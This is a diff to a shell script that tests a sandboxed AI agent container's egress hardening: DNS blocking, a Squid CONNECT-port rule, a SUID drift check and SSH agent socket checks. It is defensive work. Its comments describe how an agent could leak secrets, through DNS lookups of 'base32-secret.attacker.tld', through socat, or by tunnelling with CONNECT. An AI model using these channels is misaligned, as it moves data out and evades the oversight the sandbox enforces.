@@ -65,6 +65,80 @@ else
   pass "disallowed domain blocked by proxy"
 fi
 
+# DNS exfil tripwire (audit H2): with `internal: true` Docker still forwards
+# DNS for any name to the host resolver, so an unconstrained agent could
+# `getaddrinfo("base32-secret.attacker.tld")` and exfil via DNS subdomains.
+# The fix is `dns: [127.0.0.1]` + extra_hosts in compose. To verify it took:
+# resolution of any external name should fail. Use a guaranteed-not-internal
+# name; on PASS, getent returns empty / nonzero. Internal names (egress-proxy)
+# must still resolve via /etc/hosts.
+if getent hosts example.com >/dev/null 2>&1; then
+  fail "external DNS resolves (example.com) — DNS exfil channel open; check dns:/extra_hosts in docker-compose.yml"
+else
+  pass "external DNS does not resolve (DNS exfil blocked)"
+fi
+if getent hosts egress-proxy >/dev/null 2>&1; then
+  pass "internal hostname resolves via /etc/hosts (egress-proxy)"
+else
+  fail "egress-proxy not resolvable — extra_hosts entry missing or wrong"
+fi
+
+# CONNECT-on-non-443 tripwire (audit H1): squid.conf must include
+# `http_access deny CONNECT !SSL_ports`. Without it, CONNECT api.anthropic.com:80
+# would tunnel raw TCP. Probe via the proxy and expect a 4xx Squid denial.
+# Use 80 because it's in Safe_ports (so the test isolates the CONNECT-port
+# control, not the Safe_ports filter).
+#
+# NOTE on the probe shape: an earlier version used
+#   curl -x http://egress-proxy:3128 --proxytunnel https://api.anthropic.com:80/
+# which surfaces curl's transport error (52 / empty reply) as the literal
+# string "000" — same output you'd see if the proxy were truly off, masking
+# real H1 regressions. We instead open a raw socket to the proxy, send the
+# CONNECT request line, and parse Squid's HTTP response directly. A real H1
+# regression would return "HTTP/1.1 200 Connection established"; the deny is
+# a "HTTP/1.1 403 Forbidden".
+code=$(python3 - <<'PY' 2>/dev/null
+import socket
+try:
+    s = socket.create_connection(("egress-proxy", 3128), timeout=5)
+    s.sendall(b"CONNECT api.anthropic.com:80 HTTP/1.1\r\n"
+              b"Host: api.anthropic.com:80\r\n\r\n")
+    data = s.recv(4096)
+    s.close()
+    line = data.split(b"\r\n", 1)[0].decode("latin1", "replace")
+    parts = line.split()
+    # status line: HTTP/1.1 <code> <reason>
+    print(parts[1] if len(parts) >= 2 and parts[1].isdigit() else "000")
+except Exception:
+    print("000")
+PY
+)
+if [[ "$code" == "403" || "$code" == "400" ]]; then
+  pass "Squid denies CONNECT on non-443 ports (got HTTP $code)"
+else
+  fail "Squid allowed CONNECT to port 80 (HTTP $code) — add 'http_access deny CONNECT !SSL_ports' to squid.conf"
+fi
+
+# SUID/SGID inventory (audit M3): the container has a stock-Ubuntu SUID set
+# baked in by the base image. Anything outside that set is drift — typically
+# a wheel/.deb that snuck a SUID binary into the rootfs. The kernel boundary
+# (no_new_privileges + cap_drop:ALL) neutralizes SUID at runtime, but the
+# whole point of the tripwire is to surface drift before it's exploited.
+# `ssh-agent` and `ssh-keysign` would specifically indicate openssh-client
+# regressed, which is itself a finding worth shouting about.
+EXPECTED_SUID='chage chfn chsh expiry gpasswd mount newgrp pam_extrausers_chkpwd passwd su umount unix_chkpwd'
+ACTUAL_SUID=$(find / -xdev -perm /6000 -type f 2>/dev/null \
+              | xargs -r -n1 basename 2>/dev/null \
+              | sort -u \
+              | tr '\n' ' ' \
+              | sed 's/ $//')
+EXPECTED_NORMALIZED=$(echo "$EXPECTED_SUID" | tr ' ' '\n' | sort -u | tr '\n' ' ' | sed 's/ $//')
+if [[ "$ACTUAL_SUID" == "$EXPECTED_NORMALIZED" ]]; then
+  pass "SUID/SGID inventory matches stock Ubuntu set"
+else
+  fail "SUID/SGID drift: expected '$EXPECTED_NORMALIZED' got '$ACTUAL_SUID'"
+fi
+
 # bwrap + socat + ssh are deliberately NOT installed (Claude Code's bwrap
 # sandbox can't run here — seccomp correctly blocks unprivileged user
 # namespaces — socat was a raw-TCP exfil channel bypassing Squid HTTP
@@ -82,8 +156,16 @@ command -v ssh   >/dev/null && fail "ssh present (openssh-client should be purge
 [[ -z "${SSH_AUTH_SOCK:-}" ]] && pass "SSH_AUTH_SOCK unset (no agent forwarding)" \
   || fail "SSH_AUTH_SOCK=$SSH_AUTH_SOCK (VS Code SSH agent forwarding — disable remote.SSH.enableAgentForwarding)"
 # shellcheck disable=SC2144 -- single-path test, no glob expansion needed
+# Socket file alone is cosmetic — VS Code's attach helper creates them and
+# `/tmp` tmpfs only clears on `--force-recreate`. The real regression signal
+# is the *combination*: socket present AND (env re-injected OR ssh re-added).
+# Either mitigation alone makes the inode unusable.
 if ls /tmp/vscode-ssh-auth-*.sock >/dev/null 2>&1; then
-  fail "VS Code SSH auth socket present in /tmp"
+  if [[ -z "${SSH_AUTH_SOCK:-}" ]] && ! command -v ssh >/dev/null 2>&1; then
+    pass "VS Code SSH socket file present but env unset and ssh purged (cosmetic)"
+  else
+    fail "VS Code SSH auth socket present in /tmp AND mitigation incomplete (SSH_AUTH_SOCK set or ssh installed)"
+  fi
 else
   pass "no VS Code SSH auth socket in /tmp"
 fi
